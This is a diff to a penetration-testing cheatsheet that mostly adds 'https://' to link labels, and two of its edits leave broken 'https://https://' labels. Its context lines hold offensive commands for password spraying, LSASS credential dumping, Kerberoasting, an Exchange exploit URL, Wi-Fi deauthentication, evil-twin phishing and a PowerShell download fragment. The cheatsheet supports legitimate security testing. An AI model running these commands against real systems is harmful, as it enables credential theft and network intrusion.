@@ -3867,7 +3867,7 @@ $ wget https://github.com/snovvcrash/cheatsheets/raw/master/tools/parsenmap.py -
 $ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
 ```
 
-* [github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py)
+* [https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py)
 
 
 
@@ -4089,7 +4089,7 @@ PS > Get-ADDomainController -Discover -Service "GlobalCatalog"
 
 Discover MS Exchnage servers' FQDN names:
 
-* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
+* [https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
 
 ```
 PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
@@ -4097,7 +4097,7 @@ PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object e
 
 Discover MS SQL servers' FQDN names:
 
-* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)
+* [https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)
 
 ```
 PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
@@ -4194,7 +4194,7 @@ msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 
 Potentially valid usernames, `John Doe` as an example:
 
-* [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
+* [https://activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
 ```
 $ cat << EOF >> passwords.txt
@@ -4267,7 +4267,7 @@ $ cp t passwords.txt
 
 ### kwprocessor
 
-* [github.com/hashcat/kwprocessor](https://github.com/hashcat/kwprocessor)
+* [https://github.com/hashcat/kwprocessor](https://github.com/hashcat/kwprocessor)
 
 ```
 $ ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > passwords.txt
@@ -4310,7 +4310,7 @@ $ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 
 ### nullinux
 
-* [github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
+* [https://github.com/m8r0wn/nullinux](https://github.com/m8r0wn/nullinux)
 
 ```
 $ git clone https://github.com/m8r0wn/nullinux ~/tools/nullinux && cd ~/tools/nullinux && sudo bash setup.sh && ln -s ~/tools/nullinux/nullinux.py /usr/local/bin/nullinux.py && cd -
@@ -4321,7 +4321,7 @@ $ nullinux.py 127.0.0.1
 
 ### kerbrute
 
-* [github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
+* [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
 
 ```
 $ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
@@ -4331,7 +4331,7 @@ $ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.l
 
 ### DomainPasswordSpray
 
-* [github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
+* [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
 
 ```
 PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
@@ -4341,7 +4341,7 @@ PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Pa
 
 ### crowbar
 
-* [github.com/galkan/crowbar](https://github.com/galkan/crowbar)
+* [https://github.com/galkan/crowbar](https://github.com/galkan/crowbar)
 
 
 #### RDP
@@ -4354,7 +4354,7 @@ $ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!' -l ~/workspace/l
 
 ### impacket
 
-* [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+* [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
 ```
 $ git clone https://github.com/SecureAuthCorp/impacket ~/tools/impacket && cd ~/tools/impacket
@@ -4375,7 +4375,7 @@ $ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v '\$' | awk -F'\
 
 ### adidnsdump
 
-* [github.com/dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
+* [https://github.com/dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
 
 ```
 $ cd ~/workspace/enum/
@@ -4419,7 +4419,7 @@ $ cme smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 
 ### Empire
 
-* [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
+* [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
 
 Install:
 
@@ -4479,7 +4479,7 @@ PS > .\SharpHound.exe -c SessionLoop -d megacorp.local
 
 #### Cypher
 
-* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
+* [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
 
 Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
 
@@ -4495,7 +4495,7 @@ RETURN totalUsers, usersWithSessions, 100 * usersWithSessions / totalUsers AS pe
 
 #### BloodHound.py
 
-* [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
+* [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
 
 ```
 $ cd ~/workspace/enum/bloodhound/bloodhound.py/
@@ -4506,7 +4506,7 @@ $ bloodhound-python -c All,LoggedOn -u snovvcrash -p 'Passw0rd!' -d megacorp.loc
 
 ### dementor.py
 
-* [gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)
+* [https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)
 
 ```
 $ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC01.megacorp.local
@@ -4516,7 +4516,7 @@ $ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC01.
 
 ### printerbug.py
 
-* [https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
+* [https://https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
 
 ```
 $ ./printerbug.py megacorp.local/snovvcrash:'Passw0rd!'@DC01.megacorp.local 10.10.13.37
@@ -4526,7 +4526,7 @@ $ ./printerbug.py megacorp.local/snovvcrash:'Passw0rd!'@DC01.megacorp.local 10.1
 
 ### cve-2019-1040-scanner
 
-* [github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py](https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py)
+* [https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py](https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py)
 
 ```
 $ ./scan.py MEGACORP/snovvcrash:'Passw0rd!'@10.10.13.37
@@ -4537,9 +4537,9 @@ $ ./scan.py -target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
 
 ### PowerView
 
-* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
-* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
-* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+* [https://www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
+* [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 * [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
 * [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 * [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) [(New-GPOImmediateTask)](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
@@ -4554,9 +4554,9 @@ PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 
 ### PowerUp.ps1
 
-* [github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-* [github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
-* [recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
+* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+* [https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
+* [https://recipeforroot.com/advanced-powerup-ps1-usage/](https://recipeforroot.com/advanced-powerup-ps1-usage/)
 
 ```
 PS > Invoke-PrivescAudit
@@ -4566,7 +4566,7 @@ PS > Invoke-PrivescAudit
 
 ### PowerUpSQL.ps1
 
-* [github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+* [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
 
 ```
 PS > Get-SQLInstanceDomain
@@ -4578,7 +4578,7 @@ PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megac
 
 ### Windows-Exploit-Suggester
 
-* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
 ```
 $ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
@@ -4598,7 +4598,7 @@ PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 
 ### PrivescCheck
 
-* [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
+* [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
 
 ```
 PS > powershell.exe -exec bypass -c ". .\privesccheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object privesccheck-out.txt"
@@ -4632,7 +4632,7 @@ $client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("h
 
 ## Unsorted
 
-* [www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/)
+* [https://www.infosecmatter.com/powershell-commands-for-pentesters/](https://www.infosecmatter.com/powershell-commands-for-pentesters/)
 
 ```
 PS > systeminfo
@@ -4713,7 +4713,7 @@ PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll))
 
 ## Exchange
 
-* [swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
+* [https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
 
 
 
@@ -4800,10 +4800,10 @@ $ strings gal.oab | egrep -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" |
 
 #### PEAS
 
-* [labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
-* [labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/)
-* [github.com/FSecureLABS/peas](https://github.com/FSecureLABS/peas)
-* [github.com/snovvcrash/peas](https://github.com/snovvcrash/peas)
+* [https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
+* [https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/)
+* [https://github.com/FSecureLABS/peas](https://github.com/FSecureLABS/peas)
+* [https://github.com/snovvcrash/peas](https://github.com/snovvcrash/peas)
 
 Install:
 
@@ -4855,19 +4855,19 @@ $ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp
 
 ### Ruler
 
-* [github.com/sensepost/ruler/releases](https://github.com/sensepost/ruler/releases)
+* [https://github.com/sensepost/ruler/releases](https://github.com/sensepost/ruler/releases)
 
 
 #### Rules
 
-* [github.com/sensepost/ruler/wiki/Rules](https://github.com/sensepost/ruler/wiki/Rules)
-* [silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)
+* [https://github.com/sensepost/ruler/wiki/Rules](https://github.com/sensepost/ruler/wiki/Rules)
+* [https://silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)
 
 
 #### Forms
 
-* [github.com/sensepost/ruler/wiki/Forms](https://github.com/sensepost/ruler/wiki/Forms)
-* [sensepost.com/blog/2017/outlook-forms-and-shells/](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
+* [https://github.com/sensepost/ruler/wiki/Forms](https://github.com/sensepost/ruler/wiki/Forms)
+* [https://sensepost.com/blog/2017/outlook-forms-and-shells/](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
 
 Display forms:
 
@@ -4906,8 +4906,8 @@ $ ./build_x64_go.sh output/go_symmetric_https443.dll.go https443.exe --hidden
 
 #### Homepage
 
-* [github.com/sensepost/ruler/wiki/Homepage](https://github.com/sensepost/ruler/wiki/Homepage)
-* [sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
+* [https://github.com/sensepost/ruler/wiki/Homepage](https://github.com/sensepost/ruler/wiki/Homepage)
+* [https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
 
 Exploit:
 
@@ -4931,8 +4931,8 @@ Stager encryption is the same as for Ruler/Forms.
 
 ### CVE-2020-0688
 
-* [www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
-* [github.com/pwntester/ysoserial.net/releases/latest](https://github.com/pwntester/ysoserial.net/releases/latest)
+* [https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
+* [https://github.com/pwntester/ysoserial.net/releases/latest](https://github.com/pwntester/ysoserial.net/releases/latest)
 
 ```
 Get ViewStateUserKey: Browser → F12 → Storage → ASP.NET_SessionId
@@ -4946,8 +4946,8 @@ https://mx.megacorp.com/ecp/default.aspx?__VIEWSTATEGENERATOR=<GENERATOR>&__VIEW
 
 ### NSPI
 
-* [swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
-* [github.com/ptswarm/impacket](https://github.com/ptswarm/impacket)
+* [https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
+* [https://github.com/ptswarm/impacket](https://github.com/ptswarm/impacket)
 
 * `>= Impacket v0.9.22.dev1+20200819.170651.b5fa089b`
 
@@ -4986,8 +4986,8 @@ $ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi dnt-l
 
 ### Enumerate Users
 
-* [www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/](https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/)
-* [www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen](https://www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen)
+* [https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/](https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/)
+* [https://www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen](https://www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen)
 
 
 #### MailSniper
@@ -5003,7 +5003,7 @@ PS > Invoke-UsernameHarvestOWA -ExchHostname mx.megacorp.com -Domain MEGACORP -U
 
 #### Ruler
 
-* [github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials](https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials)
+* [https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials](https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials)
 
 Autodiscover URL implicit:
 
@@ -5026,8 +5026,8 @@ Notes:
 
 ### Parse NTLM
 
-* [github.com/nyxgeek/ntlmscan](https://github.com/nyxgeek/ntlmscan)
-* [gist.github.com/aseering/829a2270b72345a1dc42](https://gist.github.com/aseering/829a2270b72345a1dc42)
+* [https://github.com/nyxgeek/ntlmscan](https://github.com/nyxgeek/ntlmscan)
+* [https://gist.github.com/aseering/829a2270b72345a1dc42](https://gist.github.com/aseering/829a2270b72345a1dc42)
 
 
 #### Nmap
@@ -5063,9 +5063,9 @@ $ python get_ad_domain.zip -m owa mx.megacorp.com
 
 # Wi-Fi
 
-* [www.aircrack-ng.org/doku.php?id=newbie_guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
-* [defkey.com/airodump-ng-shortcuts](https://defkey.com/airodump-ng-shortcuts)
-* [xakep.ru/2020/01/27/wifi-total-pwn/](https://xakep.ru/2020/01/27/wifi-total-pwn/)
+* [https://www.aircrack-ng.org/doku.php?id=newbie_guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
+* [https://defkey.com/airodump-ng-shortcuts](https://defkey.com/airodump-ng-shortcuts)
+* [https://xakep.ru/2020/01/27/wifi-total-pwn/](https://xakep.ru/2020/01/27/wifi-total-pwn/)
 
 
 
@@ -5076,8 +5076,8 @@ $ python get_ad_domain.zip -m owa mx.megacorp.com
 
 ### TP-Link TL-WN722N v2/v3
 
-* [github.com/aircrack-ng/rtl8188eus/tree/v5.3.9](https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9)
-* [codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/](https://codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/)
+* [https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9](https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9)
+* [https://codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/](https://codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/)
 
 Chipset: TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS].
 
@@ -5114,7 +5114,7 @@ $ sudo aireplay-ng -9 wlan1
 
 ### Alfa AWUS036ACH AC1200
 
-* [github.com/aircrack-ng/rtl8812au](https://github.com/aircrack-ng/rtl8812au)
+* [https://github.com/aircrack-ng/rtl8812au](https://github.com/aircrack-ng/rtl8812au)
 
 Chipset: Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter.
 
@@ -5241,13 +5241,13 @@ $ sudo service NetworkManager restart
 
 #### 4-Way Handshake
 
-* [www.wifi-professionals.com/2019/01/4-way-handshake](https://www.wifi-professionals.com/2019/01/4-way-handshake)
-* [security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work](https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work)
-* [www.aircrack-ng.org/doku.php?id=cracking_wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
-* [security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng](https://security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng)
-* [hackware.ru/?p=74](https://hackware.ru/?p=74)
-* [hackware.ru/?p=7542](https://hackware.ru/?p=7542)
-* [hackware.ru/?p=5209](https://hackware.ru/?p=5209)
+* [https://www.wifi-professionals.com/2019/01/4-way-handshake](https://www.wifi-professionals.com/2019/01/4-way-handshake)
+* [https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work](https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work)
+* [https://www.aircrack-ng.org/doku.php?id=cracking_wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
+* [https://security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng](https://security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng)
+* [https://hackware.ru/?p=74](https://hackware.ru/?p=74)
+* [https://hackware.ru/?p=7542](https://hackware.ru/?p=7542)
+* [https://hackware.ru/?p=5209](https://hackware.ru/?p=5209)
 
 1\. Look for targets. Save BSSID (`00:00:00:00:00:01`), CH (`9`), ESSID (`SomeEssid`) and STATION (`00:00:00:00:00:02`) if deauth will be required:
 
@@ -5290,7 +5290,7 @@ $ sudo wifite -vi wlan1 --clients-only --wpa --no-wps
 
 #### PMKID
 
-* [https://habr.com/ru/company/jetinfosystems/blog/419383/](https://habr.com/ru/company/jetinfosystems/blog/419383/)
+* [https://https://habr.com/ru/company/jetinfosystems/blog/419383/](https://habr.com/ru/company/jetinfosystems/blog/419383/)
 
 ##### wifite2
 
@@ -5301,8 +5301,8 @@ $ sudo wifite -vi wlan1 --pmkid
 
 #### wifite2
 
-* [github.com/derv82/wifite2](https://github.com/derv82/wifite2)
-* [github.com/nuncan/wifite2mod](https://github.com/nuncan/wifite2mod)
+* [https://github.com/derv82/wifite2](https://github.com/derv82/wifite2)
+* [https://github.com/nuncan/wifite2mod](https://github.com/nuncan/wifite2mod)
 
 > «Поэтому оптимальный алгоритм взло… аудита следующий: определяем, включен ли на целевой точке доступа режим WPS. Если да, запускаем PixieDust. Безуспешно? Тогда перебор известных пинов. Не получилось? Проверяем, не включено ли шифрование WEP, которое тоже обходится влет. Если нет, то выполняем атаку PMKID на WPA(2). Если уж и так не получилось, тогда вспоминаем классику и ждем хендшейка (чтобы не палиться) или активно кикаем клиентов, чтобы наловить их сессии авторизации.» — [\]\[](https://xakep.ru/2020/01/27/wifi-total-pwn/)
 
@@ -5339,7 +5339,7 @@ $ sudo wifite -vi wlan1 [--kill] [-5]
 
 #### airgeddon
 
-* [github.com/v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
+* [https://github.com/v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
 
 ```
 $ git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git ~/tools/airgeddon && cd ~/tools/airgeddon
@@ -5349,8 +5349,8 @@ $ sudo bash airgeddon.sh
 
 #### wifiphisher
 
-* [github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
-* [github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst](https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst)
+* [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
+* [https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst](https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst)
 
 Install:
 
@@ -5369,14 +5369,14 @@ $ sudo wifiphisher -aI wlan1 -eI wlan2 -p wifi_connect
 
 ### Enterprise
 
-* [medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2](https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2)
+* [https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2](https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2)
 
 
 #### hostapd-wpe
 
-* [pentest.blog/attacking-wpa-enterprise-wireless-network/](https://pentest.blog/attacking-wpa-enterprise-wireless-network/)
-* [teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html](https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html)
-* [codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/](https://codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/)
+* [https://pentest.blog/attacking-wpa-enterprise-wireless-network/](https://pentest.blog/attacking-wpa-enterprise-wireless-network/)
+* [https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html](https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html)
+* [https://codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/](https://codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/)
 
 1\. Install dependencies:
 
@@ -5419,8 +5419,8 @@ $ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l?u?s ?1?1?1?1?1?1?1?1
 
 #### apd_launchpad
 
-* [github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)
-* [www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html](https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html)
+* [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)
+* [https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html](https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html)
 
 ```
 $ python ~/tools/apd_launchpad/apd_launchpad.py -t radius -s MegaCorp -i wlan1 -ch 1 -cn '*.megacorp.local' -o MegaCorp
@@ -5432,7 +5432,7 @@ eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
 
 #### EAPHammer
 
-* [github.com/s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer)
+* [https://github.com/s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer)
 
 Setup:
 
@@ -5463,14 +5463,14 @@ $ sudo ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 1 --inter
 
 ### WLAN channels
 
-* [en.wikipedia.org/wiki/List_of_WLAN_channels](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
-* [www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png](https://www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png)
+* [https://en.wikipedia.org/wiki/List_of_WLAN_channels](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
+* [https://www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png](https://www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png)
 
 
 
 ### Signal Strength
 
-* [eyesaas.com/wi-fi-signal-strength/](https://eyesaas.com/wi-fi-signal-strength/)
